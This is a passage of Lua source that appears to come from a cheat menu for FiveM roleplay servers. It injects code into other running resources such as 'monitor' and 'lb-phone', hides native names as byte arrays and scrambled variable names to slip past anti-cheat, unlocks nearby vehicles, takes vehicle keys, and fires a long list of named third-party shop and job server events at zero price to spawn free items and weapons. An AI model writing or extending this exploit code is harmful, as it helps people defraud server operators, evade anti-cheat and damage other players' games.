                                    h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y,
                            z, h, n, p) end)

                                    CreateThread(function()
                                        local p = g({80,108,97,121,101,114,80,101,100,73,100})()
                                        local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
                                        local mn = d(%s)
                                        local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

                                        g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
                                        while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do Citizen.Wait(0) end

                                        if %s then
                                            local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                                            if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                                                g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                                            end
                                        end

                                        local z = c.z + 1.0
                                        local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

                                        if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                                            g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                                            Citizen.Wait(100)
                                        end
                                    end)
                                ]], modelLit, deletePrev, warpIn)

                                pcall(MachoInjectResourceRaw, "monitor", payload)

                            elseif GetResourceState("lb-phone") == "started" then
                                sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                pcall(function()
                                    Injection("lb-phone", ([[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                                        if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end
                                        CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                                        if not %s then
                                            SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                                            SetEntityHeading(PlayerPedId(), %f)
                                        end
                                    ]]):format(tostring(deletePrevious), model, tostring(teleportInto), ogCoords.x, ogCoords.y,
                ogCoords.z, ogHeading))
                                end)

                            else
                                local fallback = enviGetStartedFallbackResource()
                                if fallback then
                                    sendNotification("Vehicle Spawn", "Spawned Vehicle", "success", 3000)
                                    Injection(fallback, string.format([[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                                        local model = "%s"
                                        local ped = PlayerPedId()
                                        local coords = GetEntityCoords(ped)
                                        local heading = GetEntityHeading(ped)
                                        local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y +
                math.cos(math.rad(heading)) * 3.0, coords.z)

                                        if %s then DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false)) end

                                        Framework.SpawnVehicle(function(vehicle)
                                            if not vehicle or not DoesEntityExist(vehicle) then return end
                                            SetVehicleOnGroundProperly(vehicle)
                                            Citizen.Wait(500)
                                            if %s then
                                                TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                                            end
                                        end, model, offset, false)
                                    ]], model, tostring(deletePrevious), tostring(teleportInto)))
                                else
                                    sendNotification("Vehicle Spawn", "No compatible framework found", "error", 3000)
                                end
                            end
                        end)
                    end
                },
                {
                    label = "Repair Vehicle",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function MoonRepairVehicle()
                                local ped = PlayerPedId()
                                if not DoesEntityExist(ped) then return end

                                local veh = GetVehiclePedIsIn(ped, false)
                                if not DoesEntityExist(veh) or veh == 0 then return end
                                if GetPedInVehicleSeat(veh, -1) ~= ped then return end

                                if not NetworkHasControlOfEntity(veh) then
                                    NetworkRequestControlOfEntity(veh)
                                    local timeout = GetGameTimer() + 750
                                    while not NetworkHasControlOfEntity(veh) and GetGameTimer() < timeout do Wait(0) end
                                    if not NetworkHasControlOfEntity(veh) then return end
                                end

                                SetVehicleUndriveable(veh, true)
                                Wait(100)

                                SetVehicleFixed(veh)
                                SetEntityHealth(veh, GetEntityMaxHealth(veh))
                                SetVehicleEngineHealth(veh, 1000.0)
                                SetVehiclePetrolTankHealth(veh, 1000.0)
                                SetVehicleBodyHealth(veh, 1000.0)

                                SetVehicleUndriveable(veh, false)
                                SetVehicleEngineOn(veh, true, true, false)
                            end

                            MoonRepairVehicle()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            function MoonRepairVehicle()
                                local ped = PlayerPedId()
                                if not DoesEntityExist(ped) then return end

                                local veh = GetVehiclePedIsIn(ped, false)
                                if not DoesEntityExist(veh) or veh == 0 then return end
                                if GetPedInVehicleSeat(veh, -1) ~= ped then return end

                                if not NetworkHasControlOfEntity(veh) then
                                    NetworkRequestControlOfEntity(veh)
                                    local timeout = GetGameTimer() + 750
                                    while not NetworkHasControlOfEntity(veh) and GetGameTimer() < timeout do Wait(0) end
                                    if not NetworkHasControlOfEntity(veh) then return end
                                end

                                SetVehicleUndriveable(veh, true)
                                Wait(100)

                                SetVehicleFixed(veh)
                                SetEntityHealth(veh, GetEntityMaxHealth(veh))
                                SetVehicleEngineHealth(veh, 1000.0)
                                SetVehiclePetrolTankHealth(veh, 1000.0)
                                SetVehicleBodyHealth(veh, 1000.0)

                                SetVehicleUndriveable(veh, false)
                                SetVehicleEngineOn(veh, true, true, false)
                            end

                            MoonRepairVehicle()
                        end
                        sendNotification("Repair Vehicle", "Vehicle repaired", "success", 2000)
                    end
                },
                {
                    label = "Delete Vehicle",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function MoonDeleteCurrentVehicle()
                                local ped = PlayerPedId()
                                if not DoesEntityExist(ped) or not IsPedInAnyVehicle(ped, false) then return end

                                local veh = GetVehiclePedIsIn(ped, false)
                                if not DoesEntityExist(veh) or veh == 0 then return end

                                if GetPedInVehicleSeat(veh, -1) ~= ped then return end

                                local vx, vy, vz = table.unpack(GetEntityVelocity(veh))
                                local speed = math.sqrt(vx * vx + vy * vy + vz * vz)
                                if speed > 1.0 then return end

                                if not NetworkHasControlOfEntity(veh) then
                                    NetworkRequestControlOfEntity(veh)
                                    local timeout = GetGameTimer() + 1000
                                    while not NetworkHasControlOfEntity(veh) and GetGameTimer() < timeout do
                                        Wait(10)
                                    end
                                end

                                if NetworkHasControlOfEntity(veh) then
                                    SetEntityAsMissionEntity(veh, true, true)
                                    DeleteVehicle(veh)
                                end
                            end

                            MoonDeleteCurrentVehicle()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            function MoonDeleteCurrentVehicle()
                                local ped = PlayerPedId()
                                if not DoesEntityExist(ped) or not IsPedInAnyVehicle(ped, false) then return end

                                local veh = GetVehiclePedIsIn(ped, false)
                                if not DoesEntityExist(veh) or veh == 0 then return end

                                if GetPedInVehicleSeat(veh, -1) ~= ped then return end

                                local vx, vy, vz = table.unpack(GetEntityVelocity(veh))
                                local speed = math.sqrt(vx * vx + vy * vy + vz * vz)
                                if speed > 1.0 then return end

                                if not NetworkHasControlOfEntity(veh) then
                                    NetworkRequestControlOfEntity(veh)
                                    local timeout = GetGameTimer() + 1000
                                    while not NetworkHasControlOfEntity(veh) and GetGameTimer() < timeout do
                                        Wait(10)
                                    end
                                end

                                if NetworkHasControlOfEntity(veh) then
                                    SetEntityAsMissionEntity(veh, true, true)
                                    DeleteVehicle(veh)
                                end
                            end

                            MoonDeleteCurrentVehicle()
                        end
                        sendNotification("Delete Vehicle", "Vehicle deleted", "success", 2000)
                    end
                },
                {
                    label = "Unlock Nearest Vehicle",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end
                            end

                            TpLMqKtXwZ()
                        ]]

                        if canInjectResource() then
                            local targetRes = GetResourceState("monitor") == "started" and "monitor" or
                GetResourceState("oxmysql") == "started" and "oxmysql" or "any"
                            MachoInjectResourceRaw(targetRes, code)
                        else
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end
                            end

                            TpLMqKtXwZ()
                        end
                        sendNotification("Unlock Vehicle", "Nearest vehicle unlocked", "success", 2000)
                    end
                },
                {
                    label = "Lock Nearest Vehicle",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function tRYpZvKLxQ()
                                local WqEoXyBkVsNzQuH = PlayerPedId
                                local LoKjBtWxFhPoZuR = GetEntityCoords
                                local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                                local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                                local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                                local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                                local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                                local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                                local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                                local ped = WqEoXyBkVsNzQuH()
                                local coords = LoKjBtWxFhPoZuR(ped)
                                local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                                    PlMnBvCxZaSdFgTrEq(veh, true, true)
                                    KjBtWxFhPoZuRZlK(veh, true)
                                    AsDfGhJkLzXcVbNmQwE(veh, 2)
                                    QwEoXyBkVsNzQuHL(veh, true)
                                end
                            end

                            tRYpZvKLxQ()
                        ]]

                        if canInjectResource() then
                            local targetRes = GetResourceState("monitor") == "started" and "monitor" or
                GetResourceState("oxmysql") == "started" and "oxmysql" or "any"
                            MachoInjectResourceRaw(targetRes, code)
                        else
                            local function tRYpZvKLxQ()
                                local WqEoXyBkVsNzQuH = PlayerPedId
                                local LoKjBtWxFhPoZuR = GetEntityCoords
                                local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                                local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                                local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                                local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                                local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                                local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                                local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                                local ped = WqEoXyBkVsNzQuH()
                                local coords = LoKjBtWxFhPoZuR(ped)
                                local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                                    PlMnBvCxZaSdFgTrEq(veh, true, true)
                                    KjBtWxFhPoZuRZlK(veh, true)
                                    AsDfGhJkLzXcVbNmQwE(veh, 2)
                                    QwEoXyBkVsNzQuHL(veh, true)
                                end
                            end

                            tRYpZvKLxQ()
                        end
                        sendNotification("Lock Vehicle", "Nearest vehicle locked", "success", 2000)
                    end
                },
                {
                    label = "Give Keys (qb)",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsIn(ped, false)
                            if veh and DoesEntityExist(veh) and veh ~= 0 then
                                local plate = GetVehicleNumberPlateText(veh)
                                TriggerServerEvent('qb-vehiclekeys:server:AcquireVehicleKeys', plate)
                            end
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            local veh = GetVehiclePedIsIn(ped, false)
                            if veh and DoesEntityExist(veh) and veh ~= 0 then
                                local plate = GetVehicleNumberPlateText(veh)
                                TriggerServerEvent('qb-vehiclekeys:server:AcquireVehicleKeys', plate)
                            end
                        end
                        sendNotification("Give Keys", "Keys acquired", "success", 2000)
                    end
                },
                {
                    label = "Max Upgrades",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            if not DoesEntityExist(ped) or not IsPedInAnyVehicle(ped, false) then return end

                            local veh = GetVehiclePedIsIn(ped, false)
                            if not DoesEntityExist(veh) or veh == 0 then return end
                            if GetPedInVehicleSeat(veh, -1) ~= ped then return end

                            if not NetworkHasControlOfEntity(veh) then
                                NetworkRequestControlOfEntity(veh)
                                Wait(100)
                            end

                            local vel = GetEntityVelocity(veh)
                            local speed = math.sqrt(vel.x * vel.x + vel.y * vel.y + vel.z * vel.z)
                            if speed > 5.0 then return end

                            if _G.lastUpgrade and GetGameTimer() - _G.lastUpgrade < 15000 then return end
                            _G.lastUpgrade = GetGameTimer()

                            SetVehicleModKit(veh, 0)

                            local modsToApply = {11, 12, 13, 15, 16, 23}
                            CreateThread(function()
                                for _, modType in ipairs(modsToApply) do
                                    local count = GetNumVehicleMods(veh, modType)
                                    if count and count > 0 then
                                        SetVehicleMod(veh, modType, count - 1, false)
                                        Wait(math.random(150, 300))
                                    end
                                end

                                ToggleVehicleMod(veh, 18, true)
                                ToggleVehicleMod(veh, 22, true)
                                SetVehicleTyresCanBurst(veh, false)
                                SetVehicleWindowTint(veh, 2)
                                SetVehicleNumberPlateTextIndex(veh, 5)
                            end)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            if not DoesEntityExist(ped) or not IsPedInAnyVehicle(ped, false) then return end

                            local veh = GetVehiclePedIsIn(ped, false)
                            if not DoesEntityExist(veh) or veh == 0 then return end
                            if GetPedInVehicleSeat(veh, -1) ~= ped then return end

                            if not NetworkHasControlOfEntity(veh) then
                                NetworkRequestControlOfEntity(veh)
                                Wait(100)
                            end

                            local vel = GetEntityVelocity(veh)
                            local speed = math.sqrt(vel.x * vel.x + vel.y * vel.y + vel.z * vel.z)
                            if speed > 5.0 then return end

                            if _G.lastUpgrade and GetGameTimer() - _G.lastUpgrade < 15000 then return end
                            _G.lastUpgrade = GetGameTimer()

                            SetVehicleModKit(veh, 0)

                            local modsToApply = {11, 12, 13, 15, 16, 23}
                            CreateThread(function()
                                for _, modType in ipairs(modsToApply) do
                                    local count = GetNumVehicleMods(veh, modType)
                                    if count and count > 0 then
                                        SetVehicleMod(veh, modType, count - 1, false)
                                        Wait(math.random(150, 300))
                                    end
                                end

                                ToggleVehicleMod(veh, 18, true)
                                ToggleVehicleMod(veh, 22, true)
                                SetVehicleTyresCanBurst(veh, false)
                                SetVehicleWindowTint(veh, 2)
                                SetVehicleNumberPlateTextIndex(veh, 5)
                            end)
                        end
                        sendNotification("Max Upgrades", "Upgrades applied", "success", 2000)
                    end
                },
                {
                    label = "Randomize Color",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            if not DoesEntityExist(ped) or not IsPedInAnyVehicle(ped, false) then return end

                            local veh = GetVehiclePedIsIn(ped, false)
                            if not DoesEntityExist(veh) or veh == 0 then return end
                            if GetPedInVehicleSeat(veh, -1) ~= ped then return end
                            if not NetworkHasControlOfEntity(veh) then return end

                            local vel = GetEntityVelocity(veh)
                            local speed = math.sqrt(vel.x * vel.x + vel.y * vel.y + vel.z * vel.z)
                            if speed > 1.5 then return end

                            if _G.lastColorChange and GetGameTimer() - _G.lastColorChange < 10000 then return end
                            _G.lastColorChange = GetGameTimer()

                            SetVehicleModKit(veh, 0)

                            local primary = math.random(0, 159)
                            local secondary = math.random(0, 159)
                            SetVehicleColours(veh, primary, secondary)
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            if not DoesEntityExist(ped) or not IsPedInAnyVehicle(ped, false) then return end

                            local veh = GetVehiclePedIsIn(ped, false)
                            if not DoesEntityExist(veh) or veh == 0 then return end
                            if GetPedInVehicleSeat(veh, -1) ~= ped then return end
                            if not NetworkHasControlOfEntity(veh) then return end

                            local vel = GetEntityVelocity(veh)
                            local speed = math.sqrt(vel.x * vel.x + vel.y * vel.y + vel.z * vel.z)
                            if speed > 1.5 then return end

                            if _G.lastColorChange and GetGameTimer() - _G.lastColorChange < 10000 then return end
                            _G.lastColorChange = GetGameTimer()

                            SetVehicleModKit(veh, 0)

                            local primary = math.random(0, 159)
                            local secondary = math.random(0, 159)
                            SetVehicleColours(veh, primary, secondary)
                        end
                        sendNotification("Randomize Color", "Color randomized", "success", 2000)
                    end
                },
                {
                    label = "Set Plate",
                    type = "button",
                    onConfirm = function()
                        openInputDialog("Enter plate text:", 8, function(plateText)
                            if not plateText or plateText == "" then
                                sendNotification("Set Plate", "Invalid plate text", "error", 2000)
                                return
                            end

                            local code = string.format([[
                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                                if veh ~= 0 then
                                    SetVehicleNumberPlateText(veh, "%s")
                                end
                            ]], plateText)

                            if canInjectResource() then
                                MachoInjectResourceRaw("any", code)
                            end
                            sendNotification("Set Plate", "Plate set to: " .. plateText, "success", 2000)
                        end)
                    end
                }                                           
            }
        }
    }
})

table.insert(activeMenu, {
    label = 'Events',
    type = 'submenu',
    tabs = {
        {
            name = 'Main Menu',
            submenu = {
                {
                    label = 'Spawn Item',
                    type = 'button',
                    onConfirm = function()
                        openInputDialog("Enter item name:", 50, function(itemName)
                            if not itemName or itemName == "" then
                                sendNotification("Error", "Invalid item name", "error", 2000)
                                return
                            end

                            openInputDialog("Enter amount:", 10, function(amountStr)
                                local amount = tonumber(amountStr)

                                if not amount or amount <= 0 then
                                    sendNotification("Error", "Invalid amount", "error", 2000)
                                    return
                                end

                                        local code = string.format([[
                                            function IuyAnLAIBNaU()
                                                CreateThread(function()
                                                    local itemName = "%s"
                                                    local amount   = %d
                                                    
                                                    local triggered = false

                                                    x_TriggerServerEvent = TriggerServerEvent


                                                    if GetResourceState("fuksus-shops") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("__ox_cb_fuksus-shops:buyItems",
                                                            "fuksus-shops",
                                                            "fuksus-shops:buyItems",
                                                            {
                                                                ["payment"] = "bank",
                                                                ["items"] = {
                                                                    [1] = {
                                                                        ["amount"] = amount,
                                                                        ["label"]  = "MoonOT",
                                                                        ["price"]  = 0,
                                                                        ["name"]   = itemName,
                                                                    },
                                                                }
                                                            })
                                                    end
                                                    if GetResourceState("cloud-shop") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('__ox_cb_cloud-shop:server:ProcessTransaction',
                                                            'cloud-shop',
                                                            'cloud-shop:server:ProcessTransaction',
                                                            'bank',
                                                            {
                                                                [1] = {
                                                                    ["quantity"] = amount,
                                                                    ["name"]     = itemName,
                                                                    ["price"]    = 0,
                                                                    ["label"]    = "MoonOT",
                                                                    ["category"] = "food",
                                                                },
                                                            })
                                                    end
                                                    if GetResourceState("devkit_blackmarkets") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('devkit_blackmarkets:buyCart', { ['payMethod'] = 'cash', ['Zone'] = 'BlackMarketOther', ['Cart'] = { [1] = { ['count'] = amount, ['label'] = ' TAN 762 AR - $100 ', ['item'] = itemName, ['price'] = 0 } } })
                                                    end                                                    
                                                    if GetResourceState("brutal_hunting") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('brutal_hunting:server:AddItem', {
                                                            {
                                                                amount = tostring(amount),
                                                                item   = itemName,
                                                                label  = "MoonOT",
                                                                price  = 0
                                                            }
                                                        })
                                                    end
                                                    if GetResourceState("ars_whitewidow_v2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                                                            items = {
                                                                {
                                                                    id = itemName,
                                                                    image = "MoonOT",
                                                                    name = "MoonOT",
                                                                    page = 1,
                                                                    price = 500,
                                                                    quantity = amount,
                                                                    stock = 999999999,
                                                                    totalPrice = 0
                                                                }
                                                            },
                                                            method = "cash",
                                                            total = 0
                                                        }, "cash")
                                                    end
                                                    if GetResourceState("ars_cannabisstore_v2") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                                                            items = {
                                                                {
                                                                    id = itemName,
                                                                    image = "MoonOT",
                                                                    name = "MoonOT",
                                                                    page = 1,
                                                                    price = 500,
                                                                    quantity = amount,
                                                                    stock = 999999999,
                                                                    totalPrice = 0
                                                                }
                                                            },
                                                            method = "cash",
                                                            total = 0
                                                        }, "cash")
                                                    end  
                                                    if GetResourceState("ak47_drugmanager") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent('ak47_drugmanager:pickedupitem', itemName, itemName, amount)
                                                    end  
                                                    if GetResourceState("ak47_khusland") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_khusland:process", itemName, {['phone']=0}, amount, 0)
                                                    end      
                                                    if GetResourceState("ak47_khusbites") == "started" and not triggered then
                                                        triggered = true
                                                        x_TriggerServerEvent("ak47_khusbites:process", itemName, {['phone']=0}, amount, 0)
                                                    end                                                                                                                                                      
                                                if GetResourceState("devkit_bbq") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("devkit_bbq:addinv", itemName, amount)
                                                end
                                                if GetResourceState("mt_printers") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("__ox_cb_mt_printers:server:itemActions", 'mt_printers', itemName, itemName, 'add')
                                                    end
                                                end
                                                if GetResourceState("qs-minerjob") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("qs-miner:givePickaxeToPlayer", itemName)
                                                    end
                                                end
                                                if GetResourceState("qs-weed") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("drugs:server:CollectionWeed", itemName)
                                                    end
                                                end
                                                if GetResourceState("BJCore") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("BJCore:Server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("CL-PizzaThis") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("CL-Pizzeria:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("ESXTuningJobV2") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("r_scripts-tuningV2:server:buyItem", itemName, amount, 0)
                                                end
                                                if GetResourceState("Pug") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("Pug:SV:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("Tk_smokev2") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("Tk_smokev2:server:AddItem", itemName)
                                                    end
                                                end
                                                if GetResourceState("ak4y-advancedFishing") == "started" and not triggered then
                                                    triggered = true
                                                    for i = 1, amount do
                                                        x_TriggerServerEvent("ak4y-advancedFishing:addItem", itemName)
                                                    end
                                                end
                                                if GetResourceState("ak4y-dailyWheel") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("ak4y-dailyWheel:giveItem", itemName, amount)
                                                end
                                                if GetResourceState("angelicxs-CivilianJobs-main") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", itemName, amount)
                                                end
                                                if GetResourceState("apex_bahama") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_bahama:client:addItem", itemName, amount)
                                                end
                                                if GetResourceState("apex_beachclub") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_beachclub:client:addItem", itemName, amount)
                                                end
                                                if GetResourceState("apex_galaxy") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_galaxy:server:giveItem", itemName, amount, 1)
                                                end
                                                if GetResourceState("apex_mirrorpark") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_mirrorpark:server:giveItem", itemName, 0, amount)
                                                end
                                                if GetResourceState("apex_pearls") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_pearls:server:giveItem", itemName, amount, 1)
                                                end
                                                if GetResourceState("apex_peckerwood") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_peckerwood:client:addItem", itemName, amount)
                                                end
                                                if GetResourceState("apex_tacofarmer") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_tacofarmer:client:addItem", itemName, amount)
                                                end
                                                if GetResourceState("apex_thetown") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("apex_thetown:client:addItem", itemName, amount)
                                                end
                                                if GetResourceState("boii-pawnshop") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("boii-pawnshop:sv:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("boii-pizzathis") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("boii-pizzathis:sv:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("boii-whitewidow") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("boii-whitewidow:server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("dcweedrollnew") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("weedroll:additem", itemName, amount)
                                                end
                                                if GetResourceState("dusa-pets") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("dusa-pets:addItem", itemName, amount)
                                                end
                                                if GetResourceState("elk-pt") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("elk-pt:buyItem", itemName, 0, amount)
                                                end
                                                if GetResourceState("es-hackphone") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("blackmarket:giveItem", itemName, amount)
                                                end
                                                if GetResourceState("esx_policejob") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("esx_policejob:giveWeapon", itemName, amount)
                                                end
                                                if GetResourceState("guru-oxyrun") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("guru-oxyrun:server:AddItem", itemName, amount)
                                                end
                                                if GetResourceState("haso-base") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("haso-base:additem", itemName, amount)
                                                end
                                                if GetResourceState("lusty94_smoking") == "started" and not triggered then
                                                    triggered = true
                                                    x_TriggerServerEvent("lusty94_smoking:server:returnItems", itemName, amount)
                                                end
